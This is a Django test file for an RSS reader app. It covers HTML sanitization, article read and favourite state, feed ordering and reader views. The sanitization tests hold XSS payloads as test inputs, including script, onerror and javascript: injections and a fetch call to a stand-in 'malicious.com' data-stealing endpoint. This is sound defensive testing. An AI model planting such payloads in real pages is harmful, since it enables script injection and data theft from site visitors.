from django.contrib.auth import get_user_model
from django.test import TestCase
from django.urls import reverse

from .models import Article, ArticleUserState, Feed


class HTMLSanitizationTests(TestCase):
    """Test HTML sanitization for Article.content field."""

    def test_dangerous_script_tags_removed(self):
        """script タグが削除される（タグのみ削除。セキュリティ的には実行されていない）"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-1",
            hash="test-hash-1",
            content='<p>Hello</p><script>alert("XSS")</script><p>World</p>',
        )
        # script タグは削除されるが内容は保持される（セキュリティ的には実行されていない）
        self.assertIn("<p>Hello</p>", article.content)
        self.assertIn("<p>World</p>", article.content)
        self.assertNotIn("<script>", article.content)
        self.assertNotIn("</script>", article.content)

    def test_iframe_tags_removed(self):
        """iframe タグが削除される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-2",
            hash="test-hash-2",
            content='<p>Embedded:</p><iframe src="https://malicious.com"></iframe>',
        )
        self.assertEqual(article.content, "<p>Embedded:</p>")
        self.assertNotIn("iframe", article.content)

    def test_onclick_attributes_removed(self):
        """onclick属性が削除される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-3",
            hash="test-hash-3",
            content='<a href="https://example.com" onclick="alert(\'XSS\')">Link</a>',
        )
        # href のみ許可属性となり、onclick は削除される
        self.assertIn('<a href="https://example.com">Link</a>', article.content)
        self.assertNotIn("onclick", article.content)

    def test_style_tags_removed(self):
        """style タグが削除される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-4",
            hash="test-hash-4",
            content="<p>Text</p><style>body { display: none; }</style>",
        )
        self.assertIn("<p>Text</p>", article.content)
        self.assertNotIn("<style>", article.content)
        self.assertNotIn("</style>", article.content)

    def test_form_tags_removed(self):
        """form タグが削除される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-5",
            hash="test-hash-5",
            content='<form action="https://malicious.com"><input type="submit"></form>',
        )
        self.assertNotIn("form", article.content)
        self.assertNotIn("input", article.content)

    def test_allowed_tags_preserved(self):
        """許可されたタグは保存される"""
        html_with_allowed_tags = """
        <h2>Title</h2>
        <p>Paragraph with <strong>bold</strong> and <em>italic</em> text.</p>
        <a href="https://example.com" title="Example">Link</a>
        <img src="https://example.com/image.jpg" alt="Image">
        <ul><li>Item 1</li><li>Item 2</li></ul>
        <blockquote>Quote</blockquote>
        <code>code snippet</code>
        """
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-6",
            hash="test-hash-6",
            content=html_with_allowed_tags,
        )
        # 許可されたタグが含まれている
        self.assertIn("<h2>Title</h2>", article.content)
        self.assertIn("<strong>bold</strong>", article.content)
        self.assertIn("<em>italic</em>", article.content)
        self.assertIn(
            '<a href="https://example.com" title="Example">Link</a>', article.content
        )
        self.assertIn("<img", article.content)
        self.assertIn("<li>Item 1</li>", article.content)
        self.assertIn("<blockquote>Quote</blockquote>", article.content)
        self.assertIn("<code>code snippet</code>", article.content)

    def test_class_attribute_allowed(self):
        """class属性は許可される（任意のタグで）"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-7",
            hash="test-hash-7",
            content='<p class="highlight">Highlighted paragraph</p>',
        )
        self.assertIn('class="highlight"', article.content)

    def test_dangerous_javascript_url_in_href_removed(self):
        """javascript: URLは削除される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-8",
            hash="test-hash-8",
            content="<a href=\"javascript:alert('XSS')\">Link</a>",
        )
        # bleach はデフォルトで javascript: URLをフィルタリング
        self.assertNotIn("javascript:", article.content)

    def test_empty_content_preserved(self):
        """空のコンテンツは保持される"""
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-9",
            hash="test-hash-9",
            content="",
        )
        self.assertEqual(article.content, "")

    def test_complex_dangerous_html_sanitized(self):
        """複雑な危険なHTMLが正しくサニタイズされる"""
        dangerous_html = """
        <h1>Article Title</h1>
        <p>Safe paragraph content</p>
        <script>
            fetch('https://malicious.com/steal-data')
        </script>
        <div onclick="alert('XSS')">
            <p>Paragraph inside div</p>
            <img src="x" onerror="alert('XSS')" alt="Image">
        </div>
        <style>
            .malicious { display: none; }
        </style>
        <iframe src="https://malicious.com/phishing"></iframe>
        <a href="https://legitimate-link.com">Safe Link</a>
        """
        article = Article.objects.create(
            title="Test Article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="test-guid-10",
            hash="test-hash-10",
            content=dangerous_html,
        )
        # 危険なタグは削除される - 実際のテキストは保持される可能性あり
        self.assertNotIn("<script>", article.content)
        self.assertNotIn("</script>", article.content)
        self.assertNotIn("onclick", article.content)
        self.assertNotIn("onerror", article.content)
        self.assertNotIn("<style>", article.content)
        self.assertNotIn("</style>", article.content)
        self.assertNotIn("<iframe>", article.content)
        self.assertNotIn("</iframe>", article.content)
        # 安全な要素は保持される
        self.assertIn("<h1>Article Title</h1>", article.content)
        self.assertIn("<p>Safe paragraph content</p>", article.content)
        self.assertIn("https://legitimate-link.com", article.content)


class ArticleUserStateTests(TestCase):
    def setUp(self):
        self.user = get_user_model().objects.create_user(
            username="reader",
            email="reader@example.com",
            password="password123",
        )
        self.article = Article.objects.create(
            title="Example article",
            link="https://example.com/article",
            normalized_link="https://example.com/article",
            guid="article-guid-1",
            hash="c1a3c9f5d9f94d29cbf5d53da03d9563795143d7f8c0f356a58c4fc73d1aab31",
        )
        self.state_api_url = reverse("article-user-state", args=[self.article.id])

    def test_api_get_unauthenticated_returns_401(self):
        response = self.client.get(self.state_api_url)

        self.assertEqual(response.status_code, 401)

    def test_api_get_authenticated_without_state_returns_all_false(self):
        self.client.force_login(self.user)

        response = self.client.get(self.state_api_url)

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()["is_favorite"], False)
        self.assertEqual(response.json()["is_read_later"], False)
        self.assertEqual(response.json()["is_read"], False)

    def test_api_patch_authenticated_creates_and_updates_row(self):
        self.client.force_login(self.user)

        create_response = self.client.patch(
            self.state_api_url,
            data={"is_favorite": True, "is_read_later": True},
            content_type="application/json",
        )
        self.assertEqual(create_response.status_code, 200)
        state = ArticleUserState.objects.get(user=self.user, article=self.article)
        self.assertEqual(state.is_favorite, True)
        self.assertEqual(state.is_read_later, True)
        self.assertEqual(state.is_read, False)

        update_response = self.client.patch(
            self.state_api_url,
            data={"is_read": True, "is_favorite": False},
            content_type="application/json",
        )
        self.assertEqual(update_response.status_code, 200)
        state.refresh_from_db()
        self.assertEqual(state.is_favorite, False)
        self.assertEqual(state.is_read_later, True)
        self.assertEqual(state.is_read, True)

    def test_web_toggle_authenticated_updates_state_and_preserves_query_params(self):
        self.client.force_login(self.user)
        toggle_url = reverse(
            "article-state-toggle", args=[self.article.id, "is_favorite"]
        )

        response = self.client.post(toggle_url, data={"q": "django", "page": "3"})

        self.assertEqual(response.status_code, 302)
        self.assertEqual(response["Location"], "/?q=django&page=3")
        state = ArticleUserState.objects.get(user=self.user, article=self.article)
        self.assertEqual(state.is_favorite, True)

    def test_web_toggle_anonymous_does_not_create_state_and_shows_error(self):
        toggle_url = reverse(
            "article-state-toggle", args=[self.article.id, "is_read_later"]
        )

        response = self.client.post(
            toggle_url, data={"q": "feeds", "page": "2"}, follow=True
        )

        self.assertEqual(response.status_code, 200)
        self.assertEqual(ArticleUserState.objects.count(), 0)
        messages = [str(message) for message in response.context["messages"]]
        self.assertIn("Please log in to update article state.", messages)


class FeedArticleBindingTests(TestCase):
    def test_feed_list_api_returns_array_for_worker(self):
        Feed.objects.create(name="Feed A", url="https://example.com/a.xml")

        response = self.client.get(reverse("feed-list"))

        self.assertEqual(response.status_code, 200)
        payload = response.json()
        self.assertIsInstance(payload, list)
        self.assertEqual(payload[0]["name"], "Feed A")

    def test_feed_list_api_returns_only_active_and_display_ordered(self):
        feed_first = Feed.objects.create(
            name="Feed First",
            url="https://example.com/first.xml",
            display_order=1,
            is_active=True,
        )
        Feed.objects.create(
            name="Feed Hidden",
            url="https://example.com/hidden.xml",
            display_order=2,
            is_active=False,
        )
        feed_last = Feed.objects.create(
            name="Feed Last",
            url="https://example.com/last.xml",
            display_order=3,
            is_active=True,
        )

        response = self.client.get(reverse("feed-list"))

        self.assertEqual(response.status_code, 200)
        payload = response.json()
        self.assertEqual(
            [item["id"] for item in payload], [feed_first.id, feed_last.id]
        )

    def test_feed_reorder_updates_display_order(self):
        feed_a = Feed.objects.create(name="Feed A", url="https://example.com/a.xml")
        feed_b = Feed.objects.create(name="Feed B", url="https://example.com/b.xml")
        feed_c = Feed.objects.create(name="Feed C", url="https://example.com/c.xml")

        response = self.client.post(
            reverse("feed-reorder"),
            data={"feed_ids": [feed_c.id, feed_a.id, feed_b.id]},
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 200)
        feed_a.refresh_from_db()
        feed_b.refresh_from_db()
        feed_c.refresh_from_db()
        self.assertEqual(feed_c.display_order, 1)
        self.assertEqual(feed_a.display_order, 2)
        self.assertEqual(feed_b.display_order, 3)

    def test_ingest_binds_article_to_feed(self):
        feed = Feed.objects.create(name="Example", url="https://example.com/rss.xml")

        response = self.client.post(
            reverse("article-ingest"),
            data=[
                {
                    "feed_id": feed.id,
                    "title": "Bound article",
                    "link": "https://example.com/a1",
                    "guid": "a1",
                }
            ],
            content_type="application/json",
        )

        self.assertEqual(response.status_code, 200)
        article = Article.objects.get(guid="a1")
        self.assertEqual(article.feed_id, feed.id)

    def test_dashboard_hides_legacy_feedless_articles(self):
        feed = Feed.objects.create(
            name="Current Feed", url="https://example.com/new.xml"
        )
        Article.objects.create(
            feed=feed,
            title="Current article",
            link="https://example.com/current",
            normalized_link="https://example.com/current",
            guid="current-guid",
            hash="b1d8f07f8d6f700e57480e3c39fc36f8d6c0fec8a9846d907f5f578f31bb0d95",
        )
        Article.objects.create(
            feed=None,
            title="Legacy article",
            link="https://example.com/legacy",
            normalized_link="https://example.com/legacy",
            guid="legacy-guid",
            hash="6f08f2161d21ef863ed3bd83f4d503f7de60d6b8f3baeb3340016be0f2f0e5f4",
        )

        response = self.client.get(reverse("rss-dashboard"))

        self.assertContains(response, "Current article")
        self.assertNotContains(response, "Legacy article")

    def test_reader_view_prefers_content_then_summary(self):
        feed = Feed.objects.create(
            name="Reader Feed", url="https://example.com/reader.xml"
        )
        content_article = Article.objects.create(
            feed=feed,
            title="Reader content article",
            link="https://example.com/content",
            normalized_link="https://example.com/content",
            guid="reader-content-guid",
            hash="afe58e95505cbec0cf70916f01f8453594e3f55442ad8f1b3d8cf905bf11f2a2",
            summary="Summary text",
            content="<p>Body content</p>",
        )
        summary_article = Article.objects.create(
            feed=feed,
            title="Reader summary article",
            link="https://example.com/summary",
            normalized_link="https://example.com/summary",
            guid="reader-summary-guid",
            hash="a5dc724e59f5c8419386f5fd4f862f13f9924ec7151ecfef58114c42f3095294",
            summary="Summary only text",
            content="",
        )

        content_response = self.client.get(
            reverse("article-reader", args=[content_article.id])
        )
        summary_response = self.client.get(
            reverse("article-reader", args=[summary_article.id])
        )

        self.assertContains(content_response, "Body content")
        self.assertContains(summary_response, "Summary only text")

    class FeedArticlesViewTests(TestCase):
        def setUp(self):
            self.user = get_user_model().objects.create_user(
                username="reader",
                email="reader@example.com",
                password="password123",
            )
            self.feed_a = Feed.objects.create(
                name="Feed A", url="https://example.com/a.xml", category="News"
            )
            self.feed_b = Feed.objects.create(
                name="Feed B", url="https://example.com/b.xml", category="Tech"
            )
            self.article_a1 = Article.objects.create(
                feed=self.feed_a,
                title="Article A1",
                link="https://example.com/a1",
                normalized_link="https://example.com/a1",
                guid="a1",
                hash="hash_a1",
            )
            self.article_a2 = Article.objects.create(
                feed=self.feed_a,
                title="Article A2",
                link="https://example.com/a2",
                normalized_link="https://example.com/a2",
                guid="a2",
                hash="hash_a2",
            )
            self.article_b1 = Article.objects.create(
                feed=self.feed_b,
                title="Article B1",
                link="https://example.com/b1",
                normalized_link="https://example.com/b1",
                guid="b1",
                hash="hash_b1",
            )

        def test_feed_articles_view_displays_only_feed_articles(self):
            response = self.client.get(reverse("feed-articles", args=[self.feed_a.id]))

            self.assertEqual(response.status_code, 200)
            self.assertContains(response, "Article A1")
            self.assertContains(response, "Article A2")
            self.assertNotContains(response, "Article B1")

        def test_feed_articles_view_returns_404_for_nonexistent_feed(self):
            response = self.client.get(reverse("feed-articles", args=[9999]))

            self.assertEqual(response.status_code, 404)

        def test_feed_articles_view_filters_by_search_query(self):
            response = self.client.get(
                reverse("feed-articles", args=[self.feed_a.id]) + "?q=A1"
            )

            self.assertContains(response, "Article A1")
            self.assertNotContains(response, "Article A2")

        def test_feed_articles_view_shows_article_counts(self):
            self.client.force_login(self.user)

            ArticleUserState.objects.create(
                user=self.user, article=self.article_a1, is_favorite=True
            )

            response = self.client.get(reverse("feed-articles", args=[self.feed_a.id]))

            self.assertContains(response, "All (2)")
            self.assertContains(response, "Favorites (1)")
